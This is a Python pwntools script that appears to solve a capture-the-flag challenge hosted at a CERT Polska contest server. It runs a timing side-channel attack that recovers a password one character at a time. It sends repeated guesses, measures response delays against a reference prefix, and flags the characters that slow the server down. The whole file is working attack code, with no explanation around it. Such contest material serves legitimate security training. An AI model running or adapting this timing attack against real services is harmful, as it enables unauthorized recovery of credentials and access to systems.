from pwn import *

r = tcp('ecsc18.hack.cert.pl', 10013)
import time,math
timez = []
pw = args['PWD'].encode()
def gettim(pwd):
    pwd += b'`'
    clt = 0.3
    for _ in range(7):
        for _ in range(30):
            r.send(pwd)
        bef = time.time()
        r.clean(clt)
        aft = time.time()
        ref = aft-bef-clt
        if ref > 0.1:
            return ref
    return 1e-5

def gettimprec(pwd):
    timez = sorted(gettim(pwd) for _ in range(7))
    return sum(timez[2:-2])/(len(timez)-4)


refp = pw[:-1] + b'`' # znak, którego na pewno nie ma w prawidłowym haśle

ref = gettimprec(refp)
print("Reference:", ref)

tmz = []
for _ in range(10):
    t = gettim(pw)
    rt = t/ref
    print("%.2f"%math.log(rt), t)
    tmz.append(rt)

print("\nAverage:")
lo = math.log(sum(sorted(tmz)[2:-2])/(len(tmz)-4))
print(lo)
allowed = args['ALLOWED']
if lo > 0.012:
    print("probably the right prefix!")
    d={}
    refp = pw+b'`'
    ref = gettimprec(refp)
    for c in allowed:
        print(c, end=' ')
        tp = gettimprec(pw+c.encode())
        d[c] = tp
        print(tp/ref)
    print('---')
    tresh = (sum(d.values())+max(d.values()))/(len(d)+1)
    for k, v in d.items():
        if v>tresh: print(pw+k.encode(), v)

